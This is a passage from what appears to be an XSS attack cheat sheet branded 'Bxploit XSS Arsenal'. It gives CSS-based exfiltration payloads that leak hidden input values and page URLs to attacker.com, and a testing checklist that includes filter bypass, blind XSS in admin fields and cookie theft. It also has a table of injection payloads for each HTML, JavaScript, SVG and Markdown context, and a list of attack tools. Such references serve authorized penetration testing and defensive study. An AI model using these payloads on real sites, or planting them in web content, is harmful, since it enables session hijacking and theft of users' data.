<!-- Data exfiltration via CSS (works everywhere) -->
<style>
  input[value^="a"] { background: url('https://attacker.com/leak?v=a'); }
  input[value^="b"] { background: url('https://attacker.com/leak?v=b'); }
  /* Character-by-character extraction of hidden input values */
</style>

<!-- @import for exfiltration -->
<style>@import url('https://attacker.com/css-exfil?page='+location.href);</style>
```

---

## 14. Testing Methodology Checklist

```
1. Map all input vectors (URL params, headers, body, cookies, file uploads)
2. Identify reflection points and injection contexts (HTML, attribute, JS, URL)
3. Test basic payloads in each context
4. Identify filters/WAF in place
5. Apply encoding and obfuscation to bypass filters
6. Check for DOM-based XSS by auditing client-side JS
7. Test stored XSS in all persistent fields
8. Inject blind XSS payloads in admin-facing fields and headers
9. Check CSP headers and test bypass vectors
10. Test framework-specific vectors based on detected stack
11. Attempt mXSS if a client-side sanitizer is in use
12. Verify impact: cookie theft, session hijack, data exfiltration
13. Document with PoC and CVSS scoring
14. Record findings in learning database
```

---

## 15. Quick Reference — Payload by Context

| Context | Payload |
|---|---|
| HTML body | `<script>alert(1)</script>` |
| HTML attribute (double-quoted) | `" onfocus=alert(1) autofocus="` |
| HTML attribute (single-quoted) | `' onfocus=alert(1) autofocus='` |
| HTML attribute (unquoted) | ` onfocus=alert(1) autofocus ` |
| href/src attribute | `javascript:alert(1)` |
| Inside `<script>` string (single) | `';alert(1)//` |
| Inside `<script>` string (double) | `";alert(1)//` |
| Inside `<script>` template literal | `${alert(1)}` |
| Inside HTML comment | `--><script>alert(1)</script><!--` |
| Inside `<style>` block | `</style><script>alert(1)</script>` |
| Inside `<textarea>` | `</textarea><script>alert(1)</script>` |
| JSON context rendered as HTML | `</script><script>alert(1)</script>` |
| SVG context | `<svg/onload=alert(1)>` |
| MathML context | `<math><mtext><img src=x onerror=alert(1)>` |
| DOM innerHTML sink | `<img src=x onerror=alert(1)>` |
| DOM location/eval sink | `javascript:alert(1)` |
| Markdown | `[x](javascript:alert(1))` |

---

## 16. Recommended Tools

| Tool | Purpose |
|---|---|
| **Dalfox** | Automated XSS scanner with blind XSS support |
| **XSStrike** | Advanced XSS detection and exploitation |
| **kxss** | Fast parameter reflection checker |
| **Gxss** | Tag-based reflection tester |
| **qsreplace** | Mass URL parameter replacement |
| **Burp Suite** (DOM Invader) | Interactive DOM XSS testing |
| **XSS Hunter** | Blind XSS payload callback platform |
| **ezXSS** | Self-hosted blind XSS platform |
| **Retire.js** | Detect vulnerable JavaScript libraries |
| **JSFuck** | JavaScript obfuscation using only `[]()!+` |
| **DOMPurify** | Test sanitizer bypasses (mXSS research) |
| **BruteXSS** | Brute-force XSS parameter testing |
| **ParamSpider** | Discover URL parameters from web archives |
| **waybackurls** | Historical URL enumeration for parameter discovery |

---

*Bxploit XSS Arsenal — for authorized penetration testing only.*
